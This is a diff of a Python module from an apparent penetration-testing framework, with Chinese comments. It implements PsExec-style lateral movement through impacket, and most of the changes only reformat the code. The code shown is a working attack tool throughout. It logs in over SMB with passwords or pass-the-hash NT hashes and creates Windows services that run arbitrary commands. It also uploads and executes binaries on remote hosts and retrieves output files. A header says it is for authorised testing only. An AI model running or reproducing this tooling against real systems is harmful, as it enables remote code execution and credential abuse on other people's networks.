@@ -6,31 +6,32 @@ PsExec 横向移动模块 - PsExec Style Lateral Movement
 用于授权安全测试，仅限合法渗透测试使用
 """
 
+import logging
+import os
+import tempfile
 import time
 import uuid
-import logging
-import tempfile
-import os
-from typing import Optional, Dict, Any
+from typing import Any, Dict, Optional
 
 from .base import (
+    AuthMethod,
     BaseLateralModule,
     Credentials,
+    ExecutionMethod,
     ExecutionResult,
     FileTransferResult,
     LateralConfig,
-    LateralStatus,
-    AuthMethod,
-    ExecutionMethod,
     LateralModuleError,
+    LateralStatus,
 )
 
 logger = logging.getLogger(__name__)
 
 # 尝试导入 impacket
 try:
+    from impacket.dcerpc.v5 import scmr, transport
     from impacket.smbconnection import SMBConnection
-    from impacket.dcerpc.v5 import transport, scmr
+
     HAS_IMPACKET = True
 except ImportError:
     HAS_IMPACKET = False
@@ -64,20 +65,17 @@ class PsExecLateral(BaseLateralModule):
             result = psexec.execute_with_output('ipconfig /all')
     """
 
-    name = 'psexec'
-    description = 'PsExec 风格横向移动，通过 SMB 和 SCM 执行命令'
+    name = "psexec"
+    description = "PsExec 风格横向移动，通过 SMB 和 SCM 执行命令"
     default_port = 445
     supported_auth = [AuthMethod.PASSWORD, AuthMethod.HASH]
     supports_file_transfer = True  # 支持 SMB 共享文件传输
 
     def __init__(
-        self,
-        target: str,
-        credentials: Credentials,
-        config: Optional[LateralConfig] = None
+        self, target: str, credentials: Credentials, config: Optional[LateralConfig] = None
     ):
         super().__init__(target, credentials, config)
-        self._smb_conn: Optional['SMBConnection'] = None
+        self._smb_conn: Optional["SMBConnection"] = None
         self._rpc_transport = None
         self._dce = None
         self._scm_handle = None
@@ -111,30 +109,27 @@ class PsExecLateral(BaseLateralModule):
         try:
             # 建立 SMB 连接
             self._smb_conn = SMBConnection(
-                self.target,
-                self.target,
-                sess_port=self.port,
-                timeout=self.config.timeout
+                self.target, self.target, sess_port=self.port, timeout=self.config.timeout
             )
 
             # 认证
             if self.credentials.method == AuthMethod.HASH:
                 self._smb_conn.login(
                     self.credentials.username,
-                    '',
-                    self.credentials.domain or '',
+                    "",
+                    self.credentials.domain or "",
                     self.credentials.lm_hash,
-                    self.credentials.nt_hash
+                    self.credentials.nt_hash,
                 )
             else:
                 self._smb_conn.login(
                     self.credentials.username,
-                    self.credentials.password or '',
-                    self.credentials.domain or ''
+                    self.credentials.password or "",
+                    self.credentials.domain or "",
                 )
 
             # 连接到 SCM
-            string_binding = f'ncacn_np:{self.target}[\\pipe\\svcctl]'
+            string_binding = f"ncacn_np:{self.target}[\\pipe\\svcctl]"
             self._rpc_transport = transport.DCERPCTransportFactory(string_binding)
             self._rpc_transport.set_smb_connection(self._smb_conn)
 
@@ -144,7 +139,7 @@ class PsExecLateral(BaseLateralModule):
 
             # 打开 SCM
             resp = scmr.hROpenSCManagerW(self._dce)
-            self._scm_handle = resp['lpScHandle']
+            self._scm_handle = resp["lpScHandle"]
 
             self._connect_time = time.time()
             self._set_status(LateralStatus.CONNECTED)
@@ -200,9 +195,7 @@ class PsExecLateral(BaseLateralModule):
         """
         if not self._dce or not self._scm_handle:
             return ExecutionResult(
-                success=False,
-                error="未连接",
-                method=ExecutionMethod.PSEXEC.value
+                success=False, error="未连接", method=ExecutionMethod.PSEXEC.value
             )
 
         self._set_status(LateralStatus.EXECUTING)
@@ -214,7 +207,7 @@ class PsExecLateral(BaseLateralModule):
 
         try:
             # 构建命令
-            binary_path = f'cmd.exe /c {command}'
+            binary_path = f"cmd.exe /c {command}"
 
             # 创建服务
             resp = scmr.hRCreateServiceW(
@@ -223,9 +216,9 @@ class PsExecLateral(BaseLateralModule):
                 service_name,
                 service_name,
                 lpBinaryPathName=binary_path,
-                dwStartType=scmr.SERVICE_DEMAND_START
+                dwStartType=scmr.SERVICE_DEMAND_START,
             )
-            service_handle = resp['lpServiceHandle']
+            service_handle = resp["lpServiceHandle"]
 
             # 启动服务
             try:
@@ -241,9 +234,9 @@ class PsExecLateral(BaseLateralModule):
 
             return ExecutionResult(
                 success=True,
-                output='命令已执行',
+                output="命令已执行",
                 duration=time.time() - start_time,
-                method=ExecutionMethod.PSEXEC.value
+                method=ExecutionMethod.PSEXEC.value,
             )
 
         except Exception as e:
@@ -252,7 +245,7 @@ class PsExecLateral(BaseLateralModule):
                 success=False,
                 error=str(e),
                 duration=time.time() - start_time,
-                method=ExecutionMethod.PSEXEC.value
+                method=ExecutionMethod.PSEXEC.value,
             )
 
         finally:
@@ -268,11 +261,7 @@ class PsExecLateral(BaseLateralModule):
                 except Exception as exc:
                     logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)
 
-    def execute_with_output(
-        self,
-        command: str,
-        timeout: Optional[float] = None
-    ) -> ExecutionResult:
+    def execute_with_output(self, command: str, timeout: Optional[float] = None) -> ExecutionResult:
         """
         执行命令并获取输出
 
@@ -290,7 +279,7 @@ class PsExecLateral(BaseLateralModule):
 
         try:
             # 执行命令并重定向输出
-            full_command = f'{command} > C:{output_file} 2>&1'
+            full_command = f"{command} > C:{output_file} 2>&1"
             result = self.execute(full_command, timeout)
 
             if not result.success:
@@ -309,7 +298,7 @@ class PsExecLateral(BaseLateralModule):
                 success=True,
                 output=output,
                 duration=time.time() - start_time,
-                method=ExecutionMethod.PSEXEC.value
+                method=ExecutionMethod.PSEXEC.value,
             )
 
         except Exception as e:
@@ -317,7 +306,7 @@ class PsExecLateral(BaseLateralModule):
                 success=False,
                 error=str(e),
                 duration=time.time() - start_time,
-                method=ExecutionMethod.PSEXEC.value
+                method=ExecutionMethod.PSEXEC.value,
             )
 
     def _read_output_file(self, remote_path: str) -> str:
@@ -325,13 +314,13 @@ class PsExecLateral(BaseLateralModule):
         if not self._smb_conn:
             return ""
 
-        fd, temp_file = tempfile.mkstemp(prefix='art_psexec_')
+        fd, temp_file = tempfile.mkstemp(prefix="art_psexec_")
         try:
             os.close(fd)
-            with open(temp_file, 'wb') as f:
+            with open(temp_file, "wb") as f:
                 self._smb_conn.getFile(self.share, remote_path, f.write)
 
-            with open(temp_file, 'r', encoding='utf-8', errors='ignore') as f:
+            with open(temp_file, "r", encoding="utf-8", errors="ignore") as f:
                 return f.read()
 
         except Exception as e:
@@ -356,8 +345,8 @@ class PsExecLateral(BaseLateralModule):
         self,
         local_path: str,
         remote_name: Optional[str] = None,
-        arguments: str = '',
-        cleanup: bool = True
+        arguments: str = "",
+        cleanup: bool = True,
     ) -> ExecutionResult:
         """
         上传并执行可执行文件
@@ -381,7 +370,7 @@ class PsExecLateral(BaseLateralModule):
             remote_path = f"\\Windows\\Temp\\{remote_name}"
 
             # 上传文件
-            with open(local_path, 'rb') as f:
+            with open(local_path, "rb") as f:
                 self._smb_conn.putFile(self.share, remote_path, f.read)
 
             self.logger.info(f"上传成功: {local_path} -> {remote_path}")
@@ -405,17 +394,14 @@ class PsExecLateral(BaseLateralModule):
                 success=False,
                 error=str(e),
                 duration=time.time() - start_time,
-                method=ExecutionMethod.PSEXEC.value
+                method=ExecutionMethod.PSEXEC.value,
             )
 
     def upload(self, local_path: str, remote_path: str) -> FileTransferResult:
         """上传文件"""
         if not self._smb_conn:
             return FileTransferResult(
-                success=False,
-                source=local_path,
-                destination=remote_path,
-                error="未连接"
+                success=False, source=local_path, destination=remote_path, error="未连接"
             )
 
         self._set_status(LateralStatus.UPLOADING)
@@ -423,12 +409,12 @@ class PsExecLateral(BaseLateralModule):
 
         try:
             # 规范化路径
-            if not remote_path.startswith('\\'):
-                remote_path = '\\' + remote_path
+            if not remote_path.startswith("\\"):
+                remote_path = "\\" + remote_path
 
             file_size = os.path.getsize(local_path)
 
-            with open(local_path, 'rb') as f:
+            with open(local_path, "rb") as f:
                 self._smb_conn.putFile(self.share, remote_path, f.read)
 
             self._set_status(LateralStatus.CONNECTED)
@@ -438,7 +424,7 @@ class PsExecLateral(BaseLateralModule):
                 source=local_path,
                 destination=f"{self.share}{remote_path}",
                 size=file_size,
-                duration=time.time() - start_time
+                duration=time.time() - start_time,
             )
 
         except Exception as e:
@@ -448,17 +434,14 @@ class PsExecLateral(BaseLateralModule):
                 source=local_path,
                 destination=remote_path,
                 error=str(e),
-                duration=time.time() - start_time
+                duration=time.time() - start_time,
             )
 
     def download(self, remote_path: str, local_path: str) -> FileTransferResult:
         """下载文件"""
         if not self._smb_conn:
             return FileTransferResult(
-                success=False,
-                source=remote_path,
-                destination=local_path,
-                error="未连接"
+                success=False, source=remote_path, destination=local_path, error="未连接"
             )
 
         self._set_status(LateralStatus.DOWNLOADING)
@@ -466,10 +449,10 @@ class PsExecLateral(BaseLateralModule):
 
         try:
             # 规范化路径
-            if not remote_path.startswith('\\'):
-                remote_path = '\\' + remote_path
+            if not remote_path.startswith("\\"):
+                remote_path = "\\" + remote_path
 
-            with open(local_path, 'wb') as f:
+            with open(local_path, "wb") as f:
                 self._smb_conn.getFile(self.share, remote_path, f.write)
 
             file_size = os.path.getsize(local_path)
@@ -480,7 +463,7 @@ class PsExecLateral(BaseLateralModule):
                 source=f"{self.share}{remote_path}",
                 destination=local_path,
                 size=file_size,
-                duration=time.time() - start_time
+                duration=time.time() - start_time,
             )
 
         except Exception as e:
@@ -490,7 +473,7 @@ class PsExecLateral(BaseLateralModule):
                 source=remote_path,
                 destination=local_path,
                 error=str(e),
-                duration=time.time() - start_time
+                duration=time.time() - start_time,
             )
 
 
@@ -498,11 +481,11 @@ class PsExecLateral(BaseLateralModule):
 def psexec(
     target: str,
     username: str,
-    password: str = '',
-    ntlm_hash: str = '',
-    domain: str = '',
-    command: str = 'whoami',
-    get_output: bool = False
+    password: str = "",
+    ntlm_hash: str = "",
+    domain: str = "",
+    command: str = "whoami",
+    get_output: bool = False,
 ) -> Dict[str, Any]:
     """
     PsExec 命令执行 (便捷函数)
@@ -517,24 +500,19 @@ def psexec(
         get_output: 是否获取输出
     """
     if not HAS_IMPACKET:
-        return {'success': False, 'error': 'impacket 未安装'}
+        return {"success": False, "error": "impacket 未安装"}
 
     creds = Credentials(
         username=username,
         password=password if password else None,
         ntlm_hash=ntlm_hash if ntlm_hash else None,
-        domain=domain
+        domain=domain,
     )
 
     client = PsExecLateral(target, creds)
 
     if not client.connect():
-        return {
-            'success': False,
-            'error': '连接失败',
-            'target': target,
-            'command': command
-        }
+        return {"success": False, "error": "连接失败", "target": target, "command": command}
 
     if get_output:
         result = client.execute_with_output(command)
@@ -544,13 +522,13 @@ def psexec(
     client.disconnect()
 
     return {
-        'success': result.success,
-        'output': result.output,
-        'error': result.error,
-        'duration': result.duration,
-        'target': target,
-        'command': command,
-        'method': result.method
+        "success": result.success,
+        "output": result.output,
+        "error": result.error,
+        "duration": result.duration,
+        "target": target,
+        "command": command,
+        "method": result.method,
     }
 
 
@@ -559,47 +537,39 @@ def psexec_upload_exec(
     username: str,
     password: str,
     local_file: str,
-    arguments: str = '',
-    domain: str = '',
-    cleanup: bool = True
+    arguments: str = "",
+    domain: str = "",
+    cleanup: bool = True,
 ) -> Dict[str, Any]:
     """
     上传并执行文件 (便捷函数)
     """
     if not HAS_IMPACKET:
-        return {'success': False, 'error': 'impacket 未安装'}
+        return {"success": False, "error": "impacket 未安装"}
 
-    creds = Credentials(
-        username=username,
-        password=password,
-        domain=domain
-    )
+    creds = Credentials(username=username, password=password, domain=domain)
 
     client = PsExecLateral(target, creds)
 
     if not client.connect():
-        return {
-            'success': False,
-            'error': '连接失败',
-            'target': target
-        }
+        return {"success": False, "error": "连接失败", "target": target}
 
     result = client.upload_and_execute(local_file, arguments=arguments, cleanup=cleanup)
     client.disconnect()
 
     return {
-        'success': result.success,
-        'output': result.output,
-        'error': result.error,
-        'duration': result.duration,
-        'target': target,
-        'file': local_file,
-        'method': result.method
+        "success": result.success,
+        "output": result.output,
+        "error": result.error,
+        "duration": result.duration,
+        "target": target,
+        "file": local_file,
+        "method": result.method,
     }
 
 
-if __name__ == '__main__':
-    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
+if __name__ == "__main__":
+    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
     logger.info("=== PsExec Lateral Movement Module ===")
     logger.info(f"impacket 可用: {HAS_IMPACKET}")
     logger.info("使用示例:")
